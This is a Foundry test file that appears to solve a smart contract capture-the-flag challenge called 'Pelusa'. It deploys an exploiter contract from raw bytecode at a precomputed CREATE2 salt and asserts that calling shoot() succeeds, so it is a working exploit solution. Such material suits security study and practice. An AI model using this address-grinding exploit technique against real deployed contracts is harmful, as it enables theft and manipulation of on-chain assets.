// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Pelusa.sol";
import "../src/Exploiter.sol";

contract PelusaTest is Test {
    Exploiter public exploiter;
    ExploiterDeployer public exploiterDeployer;
    Pelusa public pelusa;
    Game public game;
    address public owner;

    function setUp() public {
        vm.startPrank(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2); // arbitrary address
        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
        // will always be the same address keccak
        pelusa = new Pelusa(); // this address should be `0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95`
        exploiterDeployer = new ExploiterDeployer(); // this address should always be `0x652c9ACcC53e765e1d96e2455E618dAaB79bA595`
        game = new Game();
        game.updateOwner(owner);
        address _exploiter = exploiterDeployer.deploySimple("0x60a060405234801561001057600080fd5b5073a131ad247055fd2e2aa8b156a11bdec81b9ead9573ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1660601b8152505073a131ad247055fd2e2aa8b156a11bdec81b9ead9573ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527fa5088339000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516101179190610192565b6000604051808303816000865af19150503d8060008114610154576040519150601f19603f3d011682016040523d82523d6000602084013e610159565b606091505b5050506101f2565b600061016c826101a9565b61017681856101b4565b93506101868185602086016101bf565b80840191505092915050565b600061019e8284610161565b915081905092915050565b600081519050919050565b600081905092915050565b60005b838110156101dd5780820151818401526020810190506101c2565b838111156101ec576000848401525b50505050565b60805160601c61033261020d600039600050506103326000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80630d8032fe14610051578063478a4be51461006f578063db258f9c1461008d578063e09235ad146100a9575b600080fd5b6100596100c7565b6040516100669190610289565b60405180910390f35b6100776100db565b6040516100849190610289565b60405180910390f35b6100a760048036038101906100a291906101f6565b6100e1565b005b6100b1610125565b6040516100be919061026e565b60405180910390f35b60006002600181905550630150a3a2905090565b60015481565b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e09235ad6040518163ffffffff1660e01b815260040160206040518083038186803b15801561018f57600080fd5b505afa1580156101a3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101c79190610223565b905090565b6000813590506101db816102e5565b92915050565b6000815190506101f0816102e5565b92915050565b60006020828403121561020c5761020b6102e0565b5b600061021a848285016101cc565b91505092915050565b600060208284031215610239576102386102e0565b5b6000610247848285016101e1565b91505092915050565b610259816102a4565b82525050565b610268816102d6565b82525050565b60006020820190506102836000830184610250565b92915050565b600060208201905061029e600083018461025f565b92915050565b60006102af826102b6565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600080fd5b6102ee816102a4565b81146102f957600080fd5b5056fea264697066735822122060dcabe8e21547524b0371e0e62465b19d9c82215b8a478929c10fd02209e36164736f6c63430008070033", 110453729515350001633842272251362100205107584081201940600939465984776396171315);
        exploiter = Exploiter(_exploiter);
        exploiter.updateGameAddress(address(game));
    }



    function testShoot() public {
        pelusa.shoot();
        assertEq(pelusa.goals(), 2);
    }
}
